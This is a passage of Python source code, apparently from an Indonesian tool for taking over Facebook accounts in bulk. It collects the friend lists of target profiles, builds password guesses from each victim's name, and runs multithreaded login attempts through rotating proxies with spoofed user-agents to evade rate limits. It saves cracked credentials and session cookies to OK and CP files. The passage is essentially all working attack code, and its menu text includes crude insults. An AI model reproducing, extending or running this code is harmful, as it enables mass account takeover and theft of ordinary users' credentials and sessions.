				cpkuni=lin[nocp].split('|')
				cpkuh=f'# +--> {cpkuni[0]} | {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input(' \33[1;96m ENTER')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' [+]\33[1;91m File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' [+]\33[1;91m Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n [+]\33[1;96m Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+]\33[1;91m Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('[+]\33[1;91m File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# +--> {cpkuni[0]} | {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')
				nocp +=1
			input(' \33[1;96m ENTER')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' [+]\33[1;91m Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def xyzoncrackpublik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	cetak(panel('\t            [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID : {P}')
	try:
		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		print(f' {P}[{H}+{P}]\33[1;96m Total ID yang Terkumpul : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(' [+]\33[1;91m Internet Lu Gak Ada Anjing')
		exit()
	except (KeyError,IOError):
		print(' [+]\33[1;91m Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
		exit()
#-------------------[ CRACK-MASAL ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		cetak(panel('\t            [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
		jum = int(input(f' {P}[{H}+{P}]\33[1;96m Mau Berapa Idz Target  :{P} '))
	except ValueError:
		print(' [+]\33[1;91m Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f' [+]\33[1;91m Pertemanan Tidak Publik  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' \33[1;96mMasukan Idz Target Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' [+]\33[1;96m Unstable Signal ')
			exit()
	try:
		print(f' {P}[{H}+{P}]\33[1;96m Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' {P}[{H}+{P}]\33[1;96m Unstable Signal ')
		back()
	except (KeyError,IOError):
		print(f' [+]\33[1;91m Friendship Not Public {x}')
		time.sleep(3)
		back()

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
	hu = input(f' {P}[{H}+{P}] \33[1;96mPilih Urutan Idz : {P}')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' [+] \33[1;91mPilih Yang Bener Kontooll ')
		exit()
	urut = []
	urut.append(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Login Site [bold green]free.facebook.com[bold white] ',width=43,title=f"[bold green]Validate",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold green]04[/][bold white]][/] [bold cyan]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Login Site [bold green]free.facebook.com[bold white] ',width=43,title=f"[bold green]Reguler",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold green]07[/][bold white]][/] [bold cyan]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold green]08[/][bold white]][/] [bold cyan]Login Site [bold green]developer.facebook.com[bold white] ',width=43,title=f"[bold green]B-Api And Async",style=f"bold white"))
	urut.append(panel(f'[bold white][[bold green]09[/][bold white]][/] [bold cyan]Login Site [bold green]x.facebook.com[bold white] [/]\n[bold white][[bold green]10[/][bold white]][/] [bold cyan]Login Site [bold green]d.facebook.com[bold white] ',width=43,title=f"[bold green]Old Metode",style=f"bold white"))
	console.print(Columns(urut))
	hc = input(f' {P}[{H}+{P}] \33[1;96mPilih Metode : {P}')
	if hc in ['1','01']:
		method.append('validate1')
	elif hc in ['2','02']:
		method.append('validate2')
	elif hc in ['3','03']:
		method.append('validate3')
	elif hc in ['4','04']:
		method.append('reguler1')
	elif hc in ['5','05']:
		method.append('reguler2')
	elif hc in ['6','06']:
	    method.append('reguler3')
	elif hc in ['7','07']:
	    method.append('kontol')
	elif hc in ['8','08']:
	    method.append('bapi')
	elif hc in ['9','09']:
	    method.append('colmek1')
	elif hc in ['10','10']:
	    method.append('colmek2')
	else:
		method.append('validate1')
	cetak(panel('''[bold white][[bold green]01[bold white]] [bold cyan]Menggunakan Password V1 [[bold green]Recommended[bold white]]
[bold white][[bold green]02[bold white]] [bold cyan]Menggunakan Password V2 [[bold green]Very Recommended[bold white]]
[bold white][[bold green]03[bold white]] [bold cyan]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
	pwplus=input(f' {P}[{H}+{P}] \33[1;96mPilih Sandi : {P}')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		pwku=input(f' [+] {P}Sandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	
	cetak(panel(f'      [bold cyan]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Cek Apk",style=f"bold white"))
	_brayen_ = input(' [+] \33[1;96mPilih : ')
	if _brayen_ in ['']:
		print(' [+] \33[1;91mPilih Yang Bener Kontol ')
		back()
	elif _brayen_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
		
	cetak(panel(f'      [bold cyan]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Cek Opsi",style=f"bold white"))
	_brayen_ = input(' [+] \33[1;96mPilih : ')
	if _brayen_ in ['']:
		print(' [+] \33[1;91mPilih Yang Bener Kontol ')
		back()
	elif _brayen_ in ['y','Y']:
		gabriel.append('ya')
	else:
		gabriel.append('no')
	
	cetak(panel(f'[bold cyan]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
	uatambah = input(f' {P}[{H}+{P}] \33[1;96m Pilih : {P}')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' {P}[{H}+{P}] \33[1;96mMasukanUser-Agent : {P}')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	print('')
	urut = []
	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold white"))
	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold white"))
	wa.print(Columns(urut))
	cetak(panel(f'\t[bold cyan]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:

						pwv.append(nmf)
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						#pwv.append(frs+'321')
						#pwv.append(frs+'4321')
						#pwv.append(frs+'54321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'sayang')
						pwv.append(frs+'cantik')
						pwv.append('memek')
						pwv.append('sayang')

				else:

					if len(frs)<3:

						pwv.append(nmf)

					else:

						pwv.append(nmf)
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'54321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'sayang')
						pwv.append(frs+'cantik')
						pwv.append('memek')
						pwv.append('sayang')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'validate1' in method:
					pool.submit(validate1,idf,pwv)
				elif 'validate2' in method:
					pool.submit(validate2,idf,pwv)
				elif 'validate3' in method:
					pool.submit(validate3,idf,pwv)
				elif 'reguler1' in method:
					pool.submit(reguler1,idf,pwv)
				elif 'reguler2' in method:
					pool.submit(reguler2,idf,pwv)
				elif 'reguler3' in method:
					pool.submit(reguler3,idf,pwv)
				elif 'bapi' in method:
					pool.submit(bapi,idf,pwv)
				elif 'kontol' in method:
					pool.submit(kontol,idf,pwv)
				elif 'colmek1' in method:
					pool.submit(colmek1,idf,pwv)
				elif 'colmek2' in method:
					pool.submit(colmek2,idf,pwv)
				else:
					pool.submit(validate1,idf,pwv)
		print('')
	print(f'\33[1;96m  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
	print(f'{x}  [{h}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))

#--------------------[ METODE VALIDATE ]-----------------#
def validate1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=113289095462482&kid_directed_site=0&app_id=113289095462482&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Mbasic{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1674928653775%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17636995ac9aec%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Ff16a2a2e946bba%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dpointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df2322edaf71d6e4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df255f84c0ecb374%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Ff16a2a2e946bba%2526relation%253Dopener%2526frame%253Df15985874805d6%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df255f84c0ecb374%26domain%3Dpointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpointblank.id%252Ff16a2a2e946bba%26relation%3Dopener%26frame%3Df15985874805d6%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Free{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
